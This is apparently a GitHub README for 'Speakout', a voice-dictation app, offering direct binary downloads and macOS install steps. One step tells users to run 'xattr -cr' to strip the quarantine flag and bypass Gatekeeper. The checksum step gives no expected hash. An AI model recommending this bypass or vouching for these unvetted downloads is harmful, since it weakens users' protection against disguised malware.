# Speakout v8.3.4 — Local Voice Dictation & Prompt Intelligence for Apple Silicon

Speakout v8.3.4 is an ultra-fast, local-first, Metal GPU-accelerated voice dictation and prompt intelligence platform for macOS.

[![Latest Release](https://img.shields.io/badge/Release-v8.3.4_Stable-blue.svg)](https://github.com/codesource18/speakout-downloads/releases/tag/v8.3.4)
[![Architecture](https://img.shields.io/badge/Architecture-Apple_Silicon_(arm64)-orange.svg)](https://github.com/codesource18/speakout-downloads)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

---

## 📦 Direct Downloads

### 🍏 macOS (Apple Silicon M1 / M2 / M3 / M4)
- **[Speakout-v8.3.4-apple-silicon.dmg](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.3.4-apple-silicon.dmg)** (5.03 MB)
- **macOS Compatibility**: macOS 12 Monterey or higher (Optimized for macOS 15 Sequoia)

### 🪟 Windows (x86_64)
- **[Speakout-v8.3.4-windows-x64-setup.exe (Installer)](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.3.4-windows-x64-setup.exe)** (4.9 MB)
- **[Speakout-v8.3.4-windows-x64.zip (Portable)](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.3.4-windows-x64.zip)** (4.8 MB)
- **Windows Compatibility**: Windows 10 & Windows 11 (64-bit)

### 🐧 Linux (x86_64)
- **[Speakout-v8.3.4-linux-amd64.deb (Debian / Ubuntu / Mint)](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.3.4-linux-amd64.deb)** (4.2 MB)
- **[Speakout-v8.3.4-linux-x86_64.AppImage (All Linux Distros)](https://github.com/codesource18/speakout-downloads/raw/refs/heads/main/Speakout-v8.3.4-linux-x86_64.AppImage)** (5.3 MB)
- **Linux Compatibility**: Ubuntu 20.04+, Debian 11+, Fedora 36+, Arch Linux, etc.


---

## ⚡ What's New in v8.3.4

- **The Professional Prompt Framework**:
  - **Role (Persona)**: Inferred expert persona across Game Dev, Full-Stack, Systems, AI, Finance, Copywriting, Design.
  - **Context**: Context and background extraction from conversational speech.
  - **Task (Instruction)**: Direct action verbs (`Build`, `Create`, `Write`, `Refactor`, `Analyze`, `Design`, `Summarize`).
  - **Requirements & Key Features**: Clean numbered stepwise specifications.
  - **Constraints (Rules)**: Boundaries, performance gates, and rules.
  - **Format**: Output specification for production-ready code.
- **Short Text Passthrough**: Dictating 2 lines or less goes straight as clean plain text without prompt overhead.
- **Jet Speed Sub-2s Latency**: Apple Silicon Metal GPU compute with English domain pinning and audio silence trimming for sub-second recognition.
- **Liquid Glass Voice HUD**: Golden mic soundwave equalization, orbit loader processing, and gold checkmark paste.
- **Background Resident Mode**: Always active in macOS menu bar tray. Pressing Fn anywhere immediately triggers dictation.
- **100% Local-First & Zero Telemetry**: Air-gapped, zero cloud egress, 100% private.

---

## 🚀 First-Run Installation (macOS Gatekeeper)

1. Drag `Speakout.app` to your `/Applications` folder.
2. Run the quick one-time terminal unlock:
   ```bash
   xattr -cr /Applications/Speakout.app && open /Applications/Speakout.app
   ```
   *Or go to **System Settings > Privacy & Security > Security** and click **Open Anyway**.*

---

## 🔒 Verification & Integrity

```bash
# Verify download SHA-256
shasum -a 256 Speakout-v8.3.4-apple-silicon.dmg

# Verify inside-out ad-hoc signature & entitlements
codesign --verify --deep --strict --verbose=2 /Applications/Speakout.app
codesign -d --entitlements :- /Applications/Speakout.app
```
